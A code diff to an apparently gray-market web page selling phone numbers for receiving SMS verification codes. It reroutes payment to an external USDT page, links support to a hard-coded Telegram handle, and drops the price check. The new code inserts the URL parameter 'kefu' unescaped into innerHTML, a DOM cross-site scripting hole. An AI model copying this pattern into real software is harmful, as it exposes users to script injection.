@@ -722,15 +722,42 @@
 
 			let isSubmitting = false
 
-			async function handleGetCode(button) {
-				if (isSubmitting) {
-					return
-				}
+			// 动态处理参数
+			;(function () {
+				const params = new URLSearchParams(window.location.search)
+				const name = params.get('name')
+				const kefu = params.get('kefu') || 'okk13'
+				const tgid = params.get('tgid') || '5866891166'
 
+				if (name) {
+					document.title = name
+					const header = document.querySelector('.header h1')
+					if (header) header.textContent = `📱 ${name}`
+				}
+				// 统一处理客服链接 - 针对须知中的“联系客服”
+				const noticeList = document.querySelector('.notice-list')
+				if (noticeList) {
+					const kefuLi = Array.from(noticeList.querySelectorAll('li')).find((li) => li.textContent.includes('联系客服'))
+					if (kefuLi) {
+						kefuLi.innerHTML = `如遇到号码无法接收，请<a href="https://t.me/${kefu}" style="color:#3498db;text-decoration:underline;">联系客服</a>进行退款`
+					}
+					const supportLi = Array.from(noticeList.querySelectorAll('li')).find((li) => li.textContent.includes('如有问题请联系客服'))
+					if (supportLi) {
+						supportLi.innerHTML = `本平台7x24小时运行，如有问题请<a href="https://t.me/${kefu}" style="color:#3498db;text-decoration:underline;">联系客服</a>`
+					}
+				}
+			})()
+
+			async function handleGetCode(button) {
+				if (isSubmitting) return
 				isSubmitting = true
 				button.disabled = true
 				let originalText = button.textContent
 				button.textContent = '正在发起支付请求...'
+
+				const params = new URLSearchParams(window.location.search)
+				const tgid = params.get('tgid') || '5866891166'
+				const kefu = params.get('kefu') || 'okk13'
 
 				let card = button.closest('.number-card')
 				let phoneNumber = card.getAttribute('data-number')
@@ -738,53 +765,13 @@
 				let priceText = card.getAttribute('data-price')
 				let price = parseFloat(priceText.replace('$', ''))
 
-				if (isNaN(price) || price <= 0) {
-					alert('价格信息错误，请刷新页面重试')
-					button.disabled = false
-					button.textContent = originalText
-					isSubmitting = false
-					return
-				}
+				const payParams = new URLSearchParams(window.location.search)
+				payParams.set('tgid', tgid)
+				payParams.set('kefu', kefu)
+				payParams.set('title', `${country}号码${phoneNumber}短信接码服务`)
+				payParams.set('price', price.toFixed(2))
 
-				try {
-					let orderTitle = `${country}号码${phoneNumber}短信接码服务`
-
-					let formData = new URLSearchParams()
-					formData.append('title', orderTitle)
-					formData.append('price', price.toFixed(2))
-					formData.append('amount', 1)
-					formData.append('pay_amount', price.toFixed(2))
-					formData.append('img_path', '/jm/jm.png')
-
-					let response = await fetch('/custom-payment', {
-						method: 'POST',
-						headers: {
-							'Content-Type': 'application/x-www-form-urlencoded',
-						},
-						body: formData,
-					})
-
-					if (!response.ok) {
-						throw new Error(`HTTP error! status: ${response.status}`)
-					}
-
-					let responseData = await response.json()
-
-					if (responseData.url) {
-						window.location.href = responseData.url
-					} else {
-						alert('获取支付链接失败，请稍后重试')
-						button.disabled = false
-						button.textContent = originalText
-						isSubmitting = false
-					}
-				} catch (error) {
-					console.error('[错误] 处理订单时发生错误:', error)
-					button.disabled = false
-					button.textContent = originalText
-					isSubmitting = false
-					alert('处理请求时发生错误，请稍后重试')
-				}
+				window.location.href = `https://usdt8.github.io/c/index.html?${payParams.toString()}`
 			}
 
 			document.addEventListener('visibilitychange', function () {
